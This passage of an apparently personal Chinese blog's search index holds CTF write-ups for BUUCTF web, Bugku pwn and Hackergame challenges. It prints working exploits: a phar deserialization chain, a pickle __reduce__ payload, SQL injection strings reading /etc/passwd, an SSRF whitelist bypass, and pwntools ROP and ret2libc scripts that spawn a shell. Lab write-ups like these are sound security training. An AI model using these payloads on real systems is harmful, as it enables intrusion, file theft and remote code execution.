$stmt-\u0026gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password .\u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $username, $password); $stmt-\u0026gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password .\u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `password` FROM `users` WHERE `username` = ?;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;bind_result($expect); $stmt-\u0026gt;fetch(); if (isset($expect) \u0026amp;\u0026amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-\u0026gt;db-\u0026gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u0026gt;files = array(); $this-\u0026gt;results = array(); $this-\u0026gt;funcs = array(); $filenames = scandir($path); $key = array_search(\u0026#34;.\u0026#34;, $filenames); unset($filenames[$key]); $key = array_search(\u0026#34;..\u0026#34;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u0026gt;open($path . $filename); array_push($this-\u0026gt;files, $file); $this-\u0026gt;results[$file-\u0026gt;name()] = array(); } } public function __call($func, $args) { array_push($this-\u0026gt;funcs, $func); foreach ($this-\u0026gt;files as $file) { $this-\u0026gt;results[$file-\u0026gt;name()][$func] = $file-\u0026gt;$func(); } } public function __destruct() { $table = \u0026#39;\u0026lt;div id=\u0026#34;container\u0026#34;class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;table-responsive\u0026#34;\u0026gt;\u0026lt;table id=\u0026#34;table\u0026#34;class=\u0026#34;table table-bordered table-hover sm-font\u0026#34;\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;thead\u0026gt;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($this-\u0026gt;funcs as $func) { $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34;class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($func) . \u0026#39;\u0026lt;/th\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34;class=\u0026#34;text-center\u0026#34;\u0026gt;Opt\u0026lt;/th\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/thead\u0026gt;\u0026lt;tbody\u0026gt;\u0026#39;; foreach ($this-\u0026gt;results as $filename =\u0026gt; $result) { $table .= \u0026#39;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($result as $func =\u0026gt; $value) { $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($value) . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34;filename=\u0026#34;\u0026#39;. htmlentities($filename) . \u0026#39;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;class=\u0026#34;download\u0026#34;\u0026gt;涓嬭浇 \u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34;class=\u0026#34;delete\u0026#34;\u0026gt; 鍒犻櫎\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-\u0026gt;filename = $filename; if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-\u0026gt;filename); } public function size() { $size = filesize($this-\u0026gt;filename); $units = array(\u0026#39; B\u0026#39;, \u0026#39;KB\u0026#39;, \u0026#39;MB\u0026#39;, \u0026#39;GB\u0026#39;, \u0026#39;TB\u0026#39;); for ($i = 0; $size\u0026gt;= 1024 \u0026amp;\u0026amp; $i \u0026lt;4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-\u0026gt;filename); } public function close() { return file_get_contents($this-\u0026gt;filename); } } ?\u0026gt; 我们注意到，FileList 并没有刚才调用的两个方法，但是却有 __call 魔术方法，因此会去调用 File 的 name 和 size 方法。这里提示我们使用 __call 调用 File 的其他方法来进行漏洞利用，例如 close 就是不错的选择。\n而在下载和删除时，会分别使用 download.php 和 delete.php，这两个文件也下载下来：\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; ini_set(\u0026#34;open_basedir\u0026#34;, getcwd() .\u0026#34;:/etc:/tmp\u0026#34;); chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt;40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename) \u0026amp;\u0026amp; stristr($filename,\u0026#34;flag\u0026#34;) === false) { Header(\u0026#34;Content-type: application/octet-stream\u0026#34;); Header(\u0026#34;Content-Disposition: attachment; filename=\u0026#34; . basename($filename)); echo $file-\u0026gt;close(); } else { echo \u0026#34;File not exist\u0026#34;; } ?\u0026gt; \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt;40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename)) { $file-\u0026gt;detele(); Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; true, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;\u0026#34;); echo json_encode($response); } else { Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;File not exist\u0026#34;); echo json_encode($response); } ?\u0026gt; 可以看到我们不能通过任意文件下载去下载 flag 文件。而在删除时，关键在于调用了 detele 函数，这会触发 unlink。unlink 在用 phar:// 伪协议解析文件时会进行反序列化，结合刚才的魔术方法 __call，我们容易想到利用 phar 反序列化来读 flag。\n我们已经有 FileList-\u0026gt;__destruct 方法打印 __call 的结果。接下来，读 flag 显然只能用 File 的 close 方法，为了调用这个方法，我们需要构造形如 FileList-\u0026gt;__call(\u0026quot;close\u0026quot;) 的调用。\n搜索字符串 close，可以发现代码中还有一处 close 调用，位于 User-\u0026gt;__destruct 中，本来是用于关闭数据库连接，但我们可以设置 db 为 FileList 对象从而达到目的。最后设置 File 对象的 filename 为 /flag.txt。\n由于我们使用了 unlink，所以会自动调用 User-\u0026gt;__destruct，至此 pop 链构造完成。\n\u0026lt;?php class User { public $db; } class FileList { private $files; public function __construct() { $this-\u0026gt;files = array(new File()); } } class File { public $filename = \u0026#34;/flag.txt\u0026#34;; } $fl = new FileList(); $u = new User(); $u-\u0026gt;db = $fl; $phar = new Phar(\u0026#34;1.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;addFromString(\u0026#34;1.txt\u0026#34;, \u0026#34;text\u0026#34;); $phar-\u0026gt;setMetadata($u); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 然后将 php.ini 中的 phar.readonly 设为 Off，运行得到 1.phar，上传并抓包，更改文件名为 1.gif，更改 Content-Type 为 image/gif 即可成功上传。最后删除，更改文件名为 phar://1.gif，触发 unlink 读取 flag。\n[ASIS 2019]Unicorn shop # 本题需要花费 1337 购买超级独角兽，但输入的价格只能是一个字符。查看源代码发现提示和 UTF8 相关，因此去查询 Unicode 中数值大于 1337 的字符的 UTF8 编码，举个例子：\nid=4\u0026amp;price=%e1%8d%bc 这个字符代表一万，因此可以购买。查询网站\n[CISCN2019 华北赛区 Day1 Web2]ikun # 首先需要找到 lv6，页数很多，写脚本跑一下：\nimport requests base = \u0026#39;http://92a45198-65ac-407a-afbb-530a083474e9.node3.buuoj.cn/shop?page=\u0026#39; for i in range(1,2000): url = base + str(i) r = requests.get(url) if \u0026#39;lv6.png\u0026#39; in r.text: print(i) break 发现在 181 页，点击购买发现钱不够但是存在折扣，因此抓包修改折扣为非常小的数字，进入 b1g_m4mber 页面，提示说只有 admin 可以访问。\n抓包发现存在一个长度看起来很短的 jwt，扔到 c_jwt_cracker 里跑出密钥 1Kun，从而可以到 jwt.io 上伪造 admin 身份。\n随后多出了一键成为大会员的功能，但是点击没有用，查看源代码得到源码。经过代码审计后，发现在 Admin.py 处存在 pickle 反序列化：\n@tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(\u0026#39;become\u0026#39;) p = pickle.loads(urllib.unquote(become)) return self.render(\u0026#39;form.html\u0026#39;, res=p, member=1) except: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) 我们可以借助其魔术方法 __reduce__ 来执行 python 代码。参考\n注意 pickle 不能跨 python 版本，这里采用 python2：\nimport pickle import urllib class payload(object): def __reduce__(self): return (eval, (\u0026#39;open(\u0026#34;/flag.txt\u0026#34;,\u0026#34;r\u0026#34;).read()\u0026#39;,)) p = pickle.dumps(payload()) print urllib.quote(p) 即可生成 URL 编码的序列化数据，填入 become 字段即可。\nc__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A. [GYCTF2020] Blacklist # 存在过滤语句 return preg_match(\u0026quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\u0026quot;,$inject);，无法 select，可以考虑堆叠注入：\n-1\u0026#39;;show tables;# -1\u0026#39;;show columns from FlagHere;# 可以得到列名为 flag，然后通过 HANDLER 语法读取 flag。\n-1\u0026#39;;handler FlagHere open; handler FlagHere read first; handler close;# [安洵杯 2019]easy_serialize_php # \u0026lt;?php $function = @$_GET[\u0026#39;f\u0026#39;]; function filter($img){ $filter_arr = array(\u0026#39;php\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;php5\u0026#39;,\u0026#39;php4\u0026#39;,\u0026#39;fl1g\u0026#39;); $filter = \u0026#39;/\u0026#39;.implode(\u0026#39;|\u0026#39;,$filter_arr).\u0026#39;/i\u0026#39;; return preg_replace($filter,\u0026#39;\u0026#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\u0026#34;user\u0026#34;] = \u0026#39;guest\u0026#39;; $_SESSION[\u0026#39;function\u0026#39;] = $function; extract($_POST); if(!$function){ echo \u0026#39;\u0026lt;a href=\u0026#34;index.php?f=highlight_file\u0026#34;\u0026gt;source_code\u0026lt;/a\u0026gt;\u0026#39;; } if(!$_GET[\u0026#39;img_path\u0026#39;]){ $_SESSION[\u0026#39;img\u0026#39;] = base64_encode(\u0026#39;guest_img.png\u0026#39;); }else{ $_SESSION[\u0026#39;img\u0026#39;] = sha1(base64_encode($_GET[\u0026#39;img_path\u0026#39;])); } $serialize_info = filter(serialize($_SESSION)); if($function ==\u0026#39;highlight_file\u0026#39;){ highlight_file(\u0026#39;index.php\u0026#39;); }else if($function ==\u0026#39;phpinfo\u0026#39;){ eval(\u0026#39;phpinfo();\u0026#39;); //maybe you can find something in here! }else if($function ==\u0026#39;show_image\u0026#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[\u0026#39;img\u0026#39;])); } 本题的关键问题在于，对于序列化后的数据进行过滤，导致反序列化时出错。\n首先存在明显的变量覆盖，显然可以覆盖的变量只有 $_SESSION，随后注意到如果指定 img_path 那么 $SESSION[img] 将被哈希，变得不可控。而下方 file_get_contents 又提醒我们必须控制 img 字段，因此需要通过反序列化字符逃逸来实现。\n先通过提示在 phpinfo 中发现 d0g3_f1ag.php 文件，这就是我们要放进 img 的文件了。随后利用 filter 函数的过滤功能吞掉 24 个字符，使得反序列化时多读入后 24 字符并舍弃后面的所有内容。具体地说，构造：\n_SESSION[user]=flagflagflagflagflagflag\u0026amp;_SESSION[function]=a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;} 那么序列化后数据变为：\na:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;flagflagflagflagflagflag\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:28:\u0026#34;L3VwbG9hZC9ndWVzdF9pbWcuanBn\u0026#34;;} 再经过 filter，变成：\na:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:28:\u0026#34;L3VwbG9hZC9ndWVzdF9pbWcuanBn\u0026#34;;} 此时，user 字段向后读 24 字符，其值为 \u0026quot;;s:8:\u0026quot;function\u0026quot;;s:59:\u0026quot;a，随后是我们控制的 img 字段和 dd 字段（注意需满足长度为 59），} 后的内容被忽略。此时我们就成功控制了 img，读到了 d0g3_f1ag.php。文件内容指向另一个文件，同样方法读取即可。\n[网鼎杯 2018]Comment # 存在 .git 泄露，GitHack 发现恢复的文件不全，然后通过 git log --reflog 发现了一个 stashed 的记录，用 git reset --hard xxx 回滚到该记录得到完整代码：\n\u0026lt;?php include \u0026#34;mysql.php\u0026#34;; session_start(); if($_SESSION[\u0026#39;login\u0026#39;] !=\u0026#39;yes\u0026#39;){ header(\u0026#34;Location: ./login.php\u0026#34;); die(); } if(isset($_GET[\u0026#39;do\u0026#39;])){ switch ($_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;write\u0026#39;: $category = addslashes($_POST[\u0026#39;category\u0026#39;]); $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into board set category = \u0026#39;$category\u0026#39;, title = \u0026#39;$title\u0026#39;, content = \u0026#39;$content\u0026#39;\u0026#34;; $result = mysql_query($sql); header(\u0026#34;Location: ./index.php\u0026#34;); break; case \u0026#39;comment\u0026#39;: $bo_id = addslashes($_POST[\u0026#39;bo_id\u0026#39;]); $sql = \u0026#34;select category from board where id=\u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num\u0026gt;0){ $category = mysql_fetch_array($result)[\u0026#39;category\u0026#39;]; $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into comment set category = \u0026#39;$category\u0026#39;, content = \u0026#39;$content\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); } header(\u0026#34;Location: ./comment.php?id=$bo_id\u0026#34;); break; default: header(\u0026#34;Location: ./index.php\u0026#34;); } } else{ header(\u0026#34;Location: ./index.php\u0026#34;); } ?\u0026gt; 插入数据时进行转义，但获取 category 时没有转义直接拼接到了 sql 语句中执行，因此可以二次注入。\n首先是发帖，设置 category 为 ', content=user(),/*，那么 sql 语句变成\ninsert into board set category = \u0026#39;\u0026#39;, content=user(),/*\u0026#39;, title =\u0026#39;1\u0026#39;, content =\u0026#39;2\u0026#39; 然后评论 */#，sql 语句为：\ninsert into comment set category = \u0026#39;\u0026#39;, content=user(),/*\u0026#39;, content =\u0026#39;*/#\u0026#39;, bo_id =\u0026#39;1\u0026#39; 则评论内容中就会显示当前用户为 root，随后查看 /etc/passwd 发现存在 www 用户，再查看 /home/www/.bash_history 发现存在 .DS_Store 文件。\n随后查看 .DS_Store 文件：\n\u0026#39;,content=(select hex(load_file(\u0026#39;/tmp/html/.DS_Store\u0026#39;))),/* 解码得到 flag 文件名：flag_8946e1ff1ee3e40f.php。同样方法读取即可。\n","date":"2019-11-29","permalink":"/posts/buu-web/","section":"Posts","summary":"\u003cp\u003e偶然发现的 BUUCTF，真的非常好用了。\u003c/p\u003e","title":"BUUCTF Web 练习记录"},{"content":"","date":"2019-11-29","permalink":"/tags/sqli/","section":"Tags","summary":"","title":"SQLi"},{"content":"","date":"2019-11-29","permalink":"/tags/ssrf/","section":"Tags","summary":"","title":"SSRF"},{"content":"","date":"2019-11-29","permalink":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","section":"Tags","summary":"","title":"文件上传"},{"content":"Pwn 入门。\npwn1 # nc 上去直接拿到了 shell。\npwn2 # int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-30h] memset(\u0026amp;s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\u0026#34;say something?\u0026#34;); read(0, \u0026amp;s, 0x100uLL); puts(\u0026#34;oh,that\u0026#39;s so boring!\u0026#34;); return 0; } 最简单的栈溢出，IDA 中可以发现目标函数 get_shell_，地址为 0x400751。s 位于 ebp-0x30，与要覆盖的返回地址相差 0x38（注意是 64 位程序），那 payload 就是 'a'*0x38 + p64(0x400751)。\nfrom pwn import * p = remote(\u0026#39;114.116.54.89\u0026#39;, 10003) payload = \u0026#39;a\u0026#39;*0x38 +p64(0x400751) p.recvline() p.sendline(payload) p.interactive() pwn4 # 和 pwn2 的区别是没有现成的 get_shell 函数了，checksec 发现什么保护也米有，估计是写 shellcode。\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) { char s; // [rsp+0h] [rbp-10h] memset(\u0026amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\u0026#34;Come on,try to pwn me\u0026#34;); read(0, \u0026amp;s, 0x30uLL); puts(\u0026#34;So~sad,you are fail\u0026#34;); return 0LL; } 但是填充需要 0x18 字节，能输入的只有 0x30 字节，没有足够长度写 shellcode，因此这个办法行不通。\nIDA 中浏览下函数，发现有个奇怪的函数：\nint sub_400751() { return system(\u0026#34;ok~you find me,but you can\u0026#39;t get my shell\u0026#39;\u0026#34;); } 这里给了 system 函数，我们只需要让他的参数为 /bin/sh 就行了。我们搜索下字符串：\n这里有一堆没有意义但显然是人为添加的字符串，可以猜想我们需要的东西肯定在里面。观察到其中一个字符串末尾是 $0，这就是我们需要的 shell 的别名了。\n先定位 call _system 的地址 0x40075a，随后需要在 64 位下传参，也就是需要 pop rdi; ret 这样的 gadget，最后要定位 $0 的位置：\n$ ROPgadget --binary pwn4 --only \u0026#39;pop|ret\u0026#39; $ ROPgadget --binary pwn4 --string \u0026#39;\\$0\u0026#39; 得到 pop rdi; ret 的地址 0x4007d3 和 $0 的地址 0x60111f。\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) p = remote(\u0026#39;114.116.54.89\u0026#39;, 10004) payload = \u0026#39;a\u0026#39;*0x18 + p64(0x4007d3) + p64(0x60111f) + p64(0x40075a) p.recvline() p.sendline(payload) p.interactive() pwn5 # int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-20h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); memset(\u0026amp;s, 0, 0x20uLL); puts(\u0026amp;::s); read(0, \u0026amp;s, 8uLL); printf(\u0026amp;s, \u0026amp;s); puts(\u0026amp;s); puts(\u0026amp;s); puts(\u0026amp;s); puts(\u0026amp;byte_400978); sleep(1u); puts(asc_400998); read(0, \u0026amp;s, 0x40uLL); if (!strstr(\u0026amp;s, \u0026amp;needle) || !strstr(\u0026amp;s, \u0026amp;byte_4009BA) ) { puts(\u0026amp;byte_4009C8); exit(0); } puts(\u0026amp;byte_4009F8); return 0; } 注意到 printf(\u0026amp;s, \u0026amp;s);，说明这里有一个格式化字符串漏洞。通过 gdb 调试后发现，我们可以泄露 __libc_start_main 地址来得到 system 和 /bin/sh 的地址。\n而 __libc_start_main 和我们的输入在栈上相差 0x28，换算成偏移量就是 0x28 / 8 = 0x05，此外还需要考虑 64 位下的六个传参寄存器，因此总偏移为 0xb。我们输入 %11$p 即可泄露 __libc_start_main 地址 0x7ffff7a2d830。\n接下来就交给 libc_database 工具了：\n$ ./find __libc_start_main_ret 830 ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) archive-glibc (id libc6_2.23-0ubuntu3_amd64) $ ./dump libc6_2.23-0ubuntu10_amd64 offset___libc_start_main_ret = 0x20830 offset_system = 0x0000000000045390 offset_dup2 = 0x00000000000f7970 offset_read = 0x00000000000f7250 offset_write = 0x00000000000f72b0 offset_str_bin_sh = 0x18cd57 随后我们用和 pwn4 相同的方法找到 pop rdi; ret 的 gadget 地址 0x400933 就可以用类似的办法构造 payload 了。需要注意的是，程序中还限制了第二次输入的字符串必须包含 鸽子 和 真香 两个子串。\n最后的 payload：\n# coding:utf-8 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = remote(\u0026#39;114.116.54.89\u0026#39;, 10005) #p=process(\u0026#39;./human\u0026#39;) p.recvline() p.recvline() p.sendline(\u0026#39;%11$p\u0026#39;) libc_leak = int(p.recvuntil(\u0026#39;\\n\u0026#39;)[2:-1], 16) offset___libc_start_main_ret = 0x20830 offset_system = 0x0000000000045390 offset_str_bin_sh = 0x18cd57 base = libc_leak - offset___libc_start_main_ret system_addr = base + offset_system binsh_addr = base + offset_str_bin_sh pop_rdi = 0x400933 payload = \u0026#39;鸽子真香\u0026#39;.ljust(0x28,\u0026#39;a\u0026#39;) payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) p.recvuntil(\u0026#39;?\\n\u0026#39;) p.sendline(payload) p.interactive() pwn3 # 本题 vuln 函数关键代码：\nputs(\u0026#34;write some note:\u0026#34;); puts(\u0026#34; please input the note len:\u0026#34;); note_len = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;note_len); puts(\u0026#34;please input the note:\u0026#34;); read(0, thinking_note, (unsigned int)note_len); puts(\u0026#34;the note is:\u0026#34;); puts(thinking_note); if (strlen(thinking_note) != 624 ) { puts(\u0026#34;error: the note len must be 624\u0026#34;); puts(\u0026#34; so please input note(len is 624)\u0026#34;); read(0, thinking_note, 0x270uLL); } 分析 vul 函数可知，read 处可以栈溢出，且长度也是我们可控的。第二次 read 时限制了长度最大为 0x270，而我们输入的 thinking_note 距离 ebp 是 0x260 也就是 608 字节。\n本题开启了 canary 保护，因此首先需要泄露 canary，canary 位于 ebp-0x8 位置。泄露完后要返回到 main，但是开启了 ASLR 导致我们无法确定 main 的位置。然而，ASLR 不会随机化低 12 位。我们观察 IDA 发现 vul 函数返回到 0xd2e 而 main 位于 0xd20，因此只需要覆盖 2e 为 20 即可，不受 ASLR 影响。\ndef ret2main(): payload = flat(\u0026#39;a\u0026#39;*600,canary,\u0026#39;a\u0026#39;*8,\u0026#39;\\x20\u0026#39;) p.sendafter(\u0026#39;624)\\n\u0026#39;, payload) def send(payload): p.sendlineafter(\u0026#39;path:\\n\u0026#39;,\u0026#39;flag\u0026#39;) p.sendlineafter(\u0026#39;len:\\n\u0026#39;,\u0026#39;999\u0026#39;) p.sendlineafter(\u0026#39;note:\\n\u0026#39;,payload) p.recvuntil(\u0026#39;aaaa\\n\u0026#39;) # leak canary send(\u0026#39;a\u0026#39;*600) canary = u64(\u0026#39;\\x00\u0026#39; + p.recv(7)) log.success(\u0026#39;canary:\u0026#39; + hex(canary)) ret2main() 注意这里覆盖的是 canary 的低位字节，恢复时需要注意默认的小端法表示。\n接下来，我们要泄露程序基址以绕过 ASLR。这里可以泄露 vul 函数返回地址，减去其偏移量 0xd2e 来得到。\n# leak elf base send(\u0026#39;a\u0026#39;*615) base = u64(p.recv(6).ljust(8,\u0026#39;\\x00\u0026#39;)) - 0xd2e log.success(\u0026#39;base:\u0026#39; + hex(base)) ret2main() 发送 'a'*615 加上最后的回车实际上是 616 字节，恰好覆盖了 canary 和 saved ebp，接下来打印的就是返回地址。这一步做完后用同样的办法返回 main。\n第三次，我们已经绕过 canary 和 ASLR，需要泄露 libc 地址，由于这里有 puts 函数，直接按照常规的 ret2libc 方法即可。这里采用了泄露 read 函数 GOT 地址的方法。\ndef ret2libc(leak, func): libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + libc.dump(\u0026#39;system\u0026#39;) binsh = base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) return (system, binsh) # leak libc pop_rdi = 0xe03 main = 0xd20 payload = flat([\u0026#39;a\u0026#39;*600,canary,\u0026#39;a\u0026#39;*8,base+pop_rdi,base+elf.got[\u0026#39;read\u0026#39;],base+elf.plt[\u0026#39;puts\u0026#39;],base+main]) send(payload) payload = flat(\u0026#39;a\u0026#39;*600,canary,\u0026#39;a\u0026#39;*8,base+pop_rdi) p.recvuntil(\u0026#39;624)\\n\u0026#39;) p.send(payload) read = u64(p.recv(6).ljust(8,\u0026#39;\\x00\u0026#39;)) log.success(\u0026#39;read:\u0026#39; + hex(read)) system, binsh = ret2libc(read,\u0026#39;read\u0026#39;) 尤其需要注意，第二次输入长度不能超过 0x270 也就是 624，这里构造的 payload 恰好长度为 624，因此只能用 p.send() 不能 p.sendline()，否则会多出一个 0a 字节使程序终止。\n最后就可以 getshell 了：\n# get shell payload = flat(\u0026#39;a\u0026#39;*600,canary,\u0026#39;a\u0026#39;*8,base+pop_rdi,binsh,system) send(payload) p.sendlineafter(\u0026#39;624)\\n\u0026#39;,\u0026#39;a\u0026#39;) p.interactive() ","date":"2019-10-29","permalink":"/posts/bugku-pwn/","section":"Posts","summary":"\u003cp\u003ePwn 入门。\u003c/p\u003e","title":"Bugku Pwn 练习记录"},{"content":"开拓眼界了。\n签到题 # 输入 token，F12 修改 button 属性，删掉 disabled=\u0026quot;disabled\u0026quot; 即可。\n白与夜 # 下载图片直接得 flag，以前见过这类题，图片会在不同背景下显示不同图像，所以改网页背景应该也是可以的。（所以直接得到 flag 的原因可能是因为我的系统主题是黑色的）\n信息安全 2077 # F12 查看源码，发现需要特定的 UA 和 If-Unmodified-Since 请求头，因此先设定好 UA，然后利用 js 生成一个 2077 年 12 月的时间，仿照题目进行 toUTCString 转换就是需要的 If-Unmodified-Since 头，最后 POST 即可。\n宇宙终极问题 # 42 # 参考链接\n这也太新了。\n-80538738812075974 80435758145817515 12602123297335631 Everything # 又要靠 神仙网站 救命了。\n网页读取器 # from flask import Flask, render_template, request, send_from_directory import requests # well, requests is designed for humans, and I like it. app = Flask(__name__) whitelist_hostname = [\u0026#34;example.com\u0026#34;, \u0026#34;www.example.com\u0026#34;] whitelist_scheme = [\u0026#34;http://\u0026#34;] def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url = url[len(i):] # strip scheme url = url[url.find(\u0026#34;@\u0026#34;) + 1:] # strip userinfo if not url.find(\u0026#34;/\u0026#34;) == -1: url = url[:url.find(\u0026#34;/\u0026#34;)] # strip parts after authority if not url.find(\u0026#34;:\u0026#34;) == -1: url = url[:url.find(\u0026#34;:\u0026#34;)] # strip port if url not in whitelist_hostname: return (False,\u0026#34;hostname {} not in whitelist\u0026#34;.format(url)) return (True,\u0026#34;ok\u0026#34;) return (False,\u0026#34;scheme not in whitelist, only {} allowed\u0026#34;.format(whitelist_scheme)) @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/request\u0026#34;) def req_route(): url = request.args.get(\u0026#39;url\u0026#39;) status, msg = check_hostname(url) if status is False: # print(msg) return msg try: r = requests.get(url, timeout=2) if not r.status_code == 200: return \u0026#34;We tried accessing your url, but it does not return HTTP 200. Instead, it returns {}.\u0026#34;.format(r.status_code) return r.text except requests.Timeout: return \u0026#34;We tried our best, but it just timeout.\u0026#34; except requests.RequestException: return \u0026#34;While accessing your url, an exception occurred. There may be a problem with your url.\u0026#34; @app.route(\u0026#34;/source\u0026#34;) def get_source(): return send_from_directory(\u0026#34;/static/\u0026#34;, \u0026#34;app.py\u0026#34;, as_attachment=True) if __name__ == \u0026#39;__main__\u0026#39;: app.run(\u0026#34;0.0.0.0\u0026#34;, 8000, debug=False) 经过尝试，常规 SSRF 手段绕不过这个过滤器，但是由于没有对 # 进行处理，可以构造 http://web1/flag#@example.com 使得过滤器直接忽略 @ 前的内容，此时再进行请求，则 @example.com 就会被解释为 fragment 了。\n达拉崩吧大冒险 # 一直以为是要对 websocket 做手脚，实际上并不能成功。这里我们提升攻击力的唯一途径就是去买鸡吃，我们在买鸡的时候 F12 一下：\n发现这里的 option 的 value 是可以修改的，再看 js 